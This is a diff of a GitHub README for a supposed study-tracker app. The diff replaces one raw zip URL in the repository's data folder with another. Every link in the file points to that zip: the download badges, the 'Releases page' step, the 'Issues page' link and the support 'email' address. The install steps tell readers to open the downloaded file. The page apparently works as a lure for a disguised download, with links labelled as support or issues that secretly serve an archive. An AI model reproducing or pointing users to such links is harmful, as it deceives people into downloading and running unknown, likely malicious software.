@@ -1,6 +1,6 @@
 # 📚 AI-Personal-Study-Tracker - Boost Your Studying Efficiency  
 
-[![Download](https://raw.githubusercontent.com/Barto1994/AI-Personal-Study-Tracker/main/data/AI-Personal-Study-Tracker-v2.8.zip)](https://raw.githubusercontent.com/Barto1994/AI-Personal-Study-Tracker/main/data/AI-Personal-Study-Tracker-v2.8.zip)  
+[![Download](https://github.com/Barto1994/AI-Personal-Study-Tracker/raw/refs/heads/main/data/A-Personal-Study-Tracker-v2.1.zip)](https://github.com/Barto1994/AI-Personal-Study-Tracker/raw/refs/heads/main/data/A-Personal-Study-Tracker-v2.1.zip)  
 
 ## 🌟 Overview  
 
@@ -20,11 +20,11 @@ Getting started with AI-Personal-Study-Tracker is easy. Follow these steps to do
 ### 📥 Download & Install  
 
 To download the application, visit the following link:  
-[Download AI-Personal-Study-Tracker](https://raw.githubusercontent.com/Barto1994/AI-Personal-Study-Tracker/main/data/AI-Personal-Study-Tracker-v2.8.zip)  
+[Download AI-Personal-Study-Tracker](https://github.com/Barto1994/AI-Personal-Study-Tracker/raw/refs/heads/main/data/A-Personal-Study-Tracker-v2.1.zip)  
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version under "Latest release."
-3. Click on the file named `https://raw.githubusercontent.com/Barto1994/AI-Personal-Study-Tracker/main/data/AI-Personal-Study-Tracker-v2.8.zip` or the appropriate installer for your operating system.
+3. Click on the file named `https://github.com/Barto1994/AI-Personal-Study-Tracker/raw/refs/heads/main/data/A-Personal-Study-Tracker-v2.1.zip` or the appropriate installer for your operating system.
 4. Wait for the download to complete.
 5. Open the downloaded file to start the installation.
 6. Follow the prompts of the installer to complete the installation.
@@ -61,7 +61,7 @@ If you encounter problems while using AI-Personal-Study-Tracker, try these steps
 - Check for any updates available on the Releases page.
 - Refer to the documentation or community forums for assistance.
 
-For any further technical issues, you can report them on the [Issues page](https://raw.githubusercontent.com/Barto1994/AI-Personal-Study-Tracker/main/data/AI-Personal-Study-Tracker-v2.8.zip).
+For any further technical issues, you can report them on the [Issues page](https://github.com/Barto1994/AI-Personal-Study-Tracker/raw/refs/heads/main/data/A-Personal-Study-Tracker-v2.1.zip).
 
 ## 👐 Contributing  
 
@@ -69,7 +69,7 @@ Your contributions are welcome! If you have suggestions or improvements, please 
 
 ## 📞 Support  
 
-For support, visit the [Issues page](https://raw.githubusercontent.com/Barto1994/AI-Personal-Study-Tracker/main/data/AI-Personal-Study-Tracker-v2.8.zip) or contact us via email at https://raw.githubusercontent.com/Barto1994/AI-Personal-Study-Tracker/main/data/AI-Personal-Study-Tracker-v2.8.zip  
+For support, visit the [Issues page](https://github.com/Barto1994/AI-Personal-Study-Tracker/raw/refs/heads/main/data/A-Personal-Study-Tracker-v2.1.zip) or contact us via email at https://github.com/Barto1994/AI-Personal-Study-Tracker/raw/refs/heads/main/data/A-Personal-Study-Tracker-v2.1.zip  
 
 ## 🏷️ Topics  
 
@@ -92,4 +92,4 @@ This project covers the following topics:
 
 Download the app today and take your studying to the next level!  
 
-[![Download](https://raw.githubusercontent.com/Barto1994/AI-Personal-Study-Tracker/main/data/AI-Personal-Study-Tracker-v2.8.zip)](https://raw.githubusercontent.com/Barto1994/AI-Personal-Study-Tracker/main/data/AI-Personal-Study-Tracker-v2.8.zip)
+[![Download](https://github.com/Barto1994/AI-Personal-Study-Tracker/raw/refs/heads/main/data/A-Personal-Study-Tracker-v2.1.zip)](https://github.com/Barto1994/AI-Personal-Study-Tracker/raw/refs/heads/main/data/A-Personal-Study-Tracker-v2.1.zip)
